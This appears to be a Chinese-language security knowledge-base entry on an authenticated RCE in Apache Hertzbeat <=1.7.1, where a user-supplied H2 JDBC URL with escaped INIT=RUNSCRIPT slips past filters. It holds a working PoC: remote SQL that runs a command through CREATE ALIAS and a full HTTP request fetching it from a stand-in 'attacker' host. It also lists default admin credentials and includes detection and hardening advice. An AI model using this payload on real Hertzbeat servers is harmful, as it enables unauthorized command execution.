---
id: web-java-component-hertzbeat-h2-jdbc-url-bypass-rce
title: Apache Hertzbeat <=1.7.1 后台自定义监控模板 H2 JDBC URL 注入 RCE
type: scenario
domain: web
path: web/java/component
technique: hertzbeat-h2-jdbc-url-bypass-rce
tags:
- java
- hertzbeat
- h2
- jdbc
- rce
- authenticated
- monitoring
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: <= 1.7.1（原文标题与镜像版本）
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:16:01+08:00'
  notes: 已对照原文核对；Hertzbeat 1.7.1后台自定义JDBC模板、/api/monitor/detect三重过滤（BLACK_LIST、^jdbc:..://[^s]+$、x00-x1F/x7F清除）与绕过payload均一致，截图显示/tmp/fushuling已创建；后台洞无CVE，severity high合理；未复跑
url: /docs/web/java/component/web-java-component-hertzbeat-h2-jdbc-url-bypass-rce/
draft: false
kb_aliases:
- Hertzbeat H2 JDBC RCE
- Hertzbeat 后台 RCE
- /api/monitor/detect 注入
- Hertzbeat runscript 绕过
- Apache Hertzbeat 1.7.1
---

## 一句话结论

Apache Hertzbeat <=1.7.1 允许登录用户在自定义 JDBC 监控模板中填写任意 JDBC URL；虽然服务端对 `RUNSCRIPT` 关键字、`jdbc:...://` 格式和空白字符做了三重过滤，但用 H2 自身转义与不可见空格即可绕过，通过 `INIT=RUNSCRIPT FROM '远程SQL'` 在监控探测请求中执行命令。

## 原理

- Hertzbeat 的监控模板支持 `protocol: jdbc`，由用户配置 host/port/url 等参数，服务端用这些参数建立 JDBC 连接做指标采集；`url` 字段完全由用户控制，且项目默认带 H2 依赖。
- 服务端在 `/api/monitor/detect` 等处对 URL 做了三层校验：
  1. 关键字过滤：拦截 `RUNSCRIPT` 等 H2 危险关键字；
  2. 格式正则：`^jdbc:[a-zA-Z0-9]+://[^\s]+$`，要求包含 `://` 且无空白；
  3. 空白/控制字符过滤：拦截空格、制表符等。
- 三层都能被 H2 自身的解析语义绕过：
  - H2 把反斜杠当转义符，`RUN\SCRIPT` 解析为 `RUNSCRIPT`、`IN\IT` 解析为 `INIT`；
  - `jdbc:h2://mem/testdb` 满足 `://` 正则，H2 把 `//mem/testdb` 当路径，在 Linux 下前导斜杠折叠为 `/mem/testdb`，进入文件模式；
  - `FROM` 与 URL 之间用 U+00A0（不换行空格）代替普通空格，绕过空白过滤且被 H2 当作分隔符。
- 连接建立时 H2 执行 `INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'`，远程 SQL 中 `CREATE ALIAS` 定义 Java 函数并 `CALL`，触发 `Runtime.getRuntime().exec`。
- 利用需要登录后台并具备创建/探测监控的权限；默认账号为 `admin/hertzbeat`，若未改密则门槛很低。原作者报告后，Apache 认为后台洞不属于安全漏洞，修复了绕过但未分配 CVE。

## 触发条件

- 目标为 Apache Hertzbeat <=1.7.1，且默认 H2 依赖存在。
- 攻击者能登录后台（默认弱口令或已获取账号），并能创建自定义监控模板/触发 monitor detect。
- 服务端三层过滤仍存在（未修复该绕过的版本）。
- 目标可出网访问攻击者的 SQL 地址（或可用本地可控文件配合 RUNSCRIPT）。

## 利用步骤

1. 用默认或已获取的凭据登录 Hertzbeat 后台。
2. 新建一个 `protocol: jdbc`、`platform: h2` 的自定义监控模板并保存应用。
3. 准备远程 SQL，`CREATE ALIAS` 执行命令。
4. 向 `/api/monitor/detect` 提交 monitor 与 params，`url` 填入绕过后的 H2 URL。
5. 服务端建立连接时拉取并执行 SQL，命令执行。

## PoC

远程 SQL：

```sql
CREATE ALIAS EXEC AS $$
void shellexec() throws java.io.IOException {
    Runtime.getRuntime().exec("touch /tmp/pwned");
}
$$;
CALL EXEC();
```

请求：

```http
POST /api/monitor/detect HTTP/1.1
Host: 127.0.0.1:1157
Authorization: Bearer <token>
Content-Type: application/json

{"monitor":{"intervals":60,"app":"example_h2","scrape":"static","host":"aaa","name":"Majestic_Otter_26xl"},"collector":"","params":[{"display":true,"field":"host","type":1,"paramValue":"aaa"},{"display":true,"field":"port","type":0,"paramValue":9092},{"display":true,"field":"username","type":1},{"display":true,"field":"password","type":1},{"display":true,"field":"database","type":1},{"display":true,"field":"url","type":1,"paramValue":"jdbc:h2://mem/testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\\IT=RUN\\SCRIPT FROM'http://attacker/poc.sql'"}]}
```

成功标志：`/tmp/pwned` 被创建或命令侧效果出现。

## 变体与关联

- 变体：不依赖 Hertzbeat 的具体接口，只要应用允许用户控制 JDBC URL 且有同类过滤，就可用同一组 H2 绕过。
- 变体：Windows 目标需把 `//mem/testdb` 换成合法盘符路径；不可见空白也可尝试其他 Unicode 空白字符。
- 关联：[[web-java-component-h2-jdbc-url-filter-bypass-runscript]]（H2 URL 绕过原语详解）。
- 关联：[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（H2 INIT + CREATE ALIAS 基础链）。
- 边界：需后台权限；默认口令已改、账号无监控模板权限、H2 依赖被移除、过滤升级或出网受限时，利用不成立。

## 检测与防御

- 检测：`/api/monitor/detect` 或监控配置中出现 `INIT=`、`RUNSCRIPT`、`IN\IT`、`RUN\SCRIPT`、`jdbc:h2://`、` `；请求后应用进程派生 shell/命令。
- 防御：禁止用户填写任意 JDBC URL，按驱动类型与地址做白名单；升级到修复绕过后的 Hertzbeat 版本。
- 加固：修改默认管理员口令，限制后台访问；生产环境移除 H2 依赖或禁用 `INIT`；限制应用出网；对监控模板变更做审计告警。
